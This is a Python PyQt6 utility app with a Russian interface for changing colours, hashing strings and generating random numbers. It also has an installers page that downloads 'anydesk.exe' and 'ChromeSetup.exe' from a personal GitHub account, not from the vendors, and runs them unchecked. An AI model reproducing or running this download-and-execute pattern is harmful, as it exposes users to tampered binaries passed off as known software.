import sys
import wget
import os
import random
import hashlib
import tempfile
import subprocess
import platform
from random import choice
from PyQt6.QtWidgets import (
    QApplication, QWidget, QPushButton, QLabel, QVBoxLayout, QHBoxLayout,
    QMessageBox, QDialog, QGridLayout, QLineEdit, QStackedLayout
)
from PyQt6.QtGui import QPalette, QColor
from PyQt6.QtCore import Qt


def open_file(path):
    """Кроссплатформенное открытие файлов."""
    if platform.system() == "Windows":
        os.startfile(path)
    elif platform.system() == "Darwin":  # macOS
        subprocess.run(["open", path])
    else:  # Linux
        subprocess.run(["xdg-open", path])


color_list = ['Indigo', 'SlateBlue', 'DarkSlateBlue', 'DarkMagenta', 'Cornsilk',
              'RosyBrown', 'Chocolate', 'Gray', 'Maroon', 'Teal', 'MediumSlateBlue', 'PowderBlue',
              'ForestGreen', 'LawnGreen', 'Linen', 'DarkSlateGray', 'LightYellow', 'LightSalmon',
              'GreenYellow', 'SeaGreen', 'Khaki', 'Fuchsia', 'PeachPuff', 'OliveDrab']


class HashSelectionDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        layout = QGridLayout()
        algorithms = ["MD5", "SHA256", "SHA512", "SHA1"]
        for i, algo in enumerate(algorithms):
            btn = QPushButton(algo)
            btn.clicked.connect(lambda _, a=algo.lower(): self.select_algorithm(a))
            layout.addWidget(btn, i // 2, i % 2)
        self.setLayout(layout)

    def select_algorithm(self, algorithm):
        self.algorithm_selected = algorithm
        self.accept()


class MainWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setFixedSize(850, 500)
        palette = QPalette()
        palette.setColor(QPalette.ColorRole.Window, QColor('NavajoWhite'))
        self.setPalette(palette)
        self.setAutoFillBackground(True)

        main_layout = QVBoxLayout(self)

        # Кнопки сверху
        button_layout = QHBoxLayout()
        self.buttons = []
        for name, method in [("Изменение цвета", self.show_home),
                             ("Установщики", self.show_installers),
                             ("Хеширование", self.show_hashing),
                             ("Рандомайзер", self.show_randomizer)]:
            btn = QPushButton(name)
            btn.setStyleSheet(self.button_style())
            btn.clicked.connect(method)
            self.buttons.append(btn)
            button_layout.addWidget(btn)

        main_layout.addLayout(button_layout)

        # Стек страниц
        self.stack = QStackedLayout()
        main_layout.addLayout(self.stack)

        # Главная страница
        self.page_home = QLabel("Привет, " + os.getlogin())
        self.page_home.setStyleSheet('font-size: 20px')
        self.page_home.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.stack.addWidget(self.page_home)

        # Плейсхолдеры для других страниц
        self.page_installers = QWidget()
        self.page_hashing = QWidget()
        self.page_randomizer = QWidget()

        self.show_home()

    def button_style(self):
        return ('background-color: BurlyWood; font-size: 16px; padding: 10px; border-radius: 5px;')

    def show_home(self):
        bg_color = choice(color_list)
        palette = self.palette()
        palette.setColor(QPalette.ColorRole.Window, QColor(bg_color))
        self.setPalette(palette)
        self.page_home.setText(f"Цвет фона изменился на {bg_color}")
        self.stack.setCurrentWidget(self.page_home)

    def show_installers(self):
        layout = QVBoxLayout()
        items = [("Anydesk", self.download_anydesk), ("Chrome", self.download_chrome)]
        for name, func in items:
            hlayout = QHBoxLayout()
            label = QLabel(name)
            label.setStyleSheet('font-size: 20px')
            btn = QPushButton('Скачать и открыть')
            btn.setStyleSheet(self.button_style())
            btn.clicked.connect(func)
            hlayout.addWidget(label)
            hlayout.addWidget(btn)
            layout.addLayout(hlayout)

        self.page_installers.setLayout(layout)
        if self.stack.indexOf(self.page_installers) == -1:
            self.stack.addWidget(self.page_installers)
        self.stack.setCurrentWidget(self.page_installers)

    def download_anydesk(self):
        url = "https://github.com/zxcsovamb/m9snoi/raw/refs/heads/main/anydesk.exe"
        output_path = os.path.join(tempfile.gettempdir(), "anydesk.exe")
        self.download_and_open(url, output_path, "Anydesk")

    def download_chrome(self):
        url = "https://github.com/zxcsovamb/midnight/raw/refs/heads/main/ChromeSetup.exe"
        output_path = os.path.join(tempfile.gettempdir(), "ChromeSetup.exe")
        self.download_and_open(url, output_path, "Chrome")

    def download_and_open(self, url, output_path, name):
        try:
            wget.download(url, out=output_path)
            open_file(output_path)
            QMessageBox.information(self, "Успех", f"{name} успешно загружен и открыт!")
        except Exception as e:
            QMessageBox.critical(self, "Ошибка", str(e))

    def show_hashing(self):
        layout = QVBoxLayout()
        input_field = QLineEdit()
        input_field.setPlaceholderText("Введите строку для хэширования...")
        input_field.setStyleSheet('font-size: 16px; padding: 10px; border-radius: 5px; background-color: WhiteSmoke;')
        submit_button = QPushButton("Выбрать алгоритм")
        submit_button.setStyleSheet(self.button_style())
        submit_button.clicked.connect(lambda: self.open_hash_selection(input_field.text()))

        layout.addWidget(input_field)
        layout.addWidget(submit_button)
        self.page_hashing.setLayout(layout)
        if self.stack.indexOf(self.page_hashing) == -1:
            self.stack.addWidget(self.page_hashing)
        self.stack.setCurrentWidget(self.page_hashing)

    def open_hash_selection(self, data_to_hash):
        dialog = HashSelectionDialog(self)
        result = dialog.exec()
        if result == QDialog.DialogCode.Accepted and hasattr(dialog, 'algorithm_selected'):
            self.calculate_hash(data_to_hash, dialog.algorithm_selected)

    def calculate_hash(self, data, algorithm):
        try:
            hash_funcs = {
                "md5": hashlib.md5,
                "sha256": hashlib.sha256,
                "sha512": hashlib.sha512,
                "sha1": hashlib.sha1
            }
            hashed_data = hash_funcs[algorithm](data.encode()).hexdigest()
            QApplication.clipboard().setText(hashed_data)
            QMessageBox.information(self, "Результат хэширования",
                                    f"Алгоритм: {algorithm.upper()} \n\n"
                                    f"Хэш:\n{hashed_data} \n\n"
                                    f"Скопировано в буфер обмена!")
        except Exception as e:
            QMessageBox.critical(self, "Ошибка", str(e))

    def show_randomizer(self):
        number = str(random.randint(1, 9999999999))
        dlg = QMessageBox(self)
        dlg.setWindowTitle("Рандомайзер")
        dlg.setText(f"Число: {number} Скопировать?")
        dlg.setStandardButtons(QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        dlg.setIcon(QMessageBox.Icon.Question)
        button = dlg.exec()

        if button == QMessageBox.StandardButton.Yes:
            QApplication.clipboard().setText(number)
            QMessageBox.information(self, "Окно", "Успешно!")


if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec())
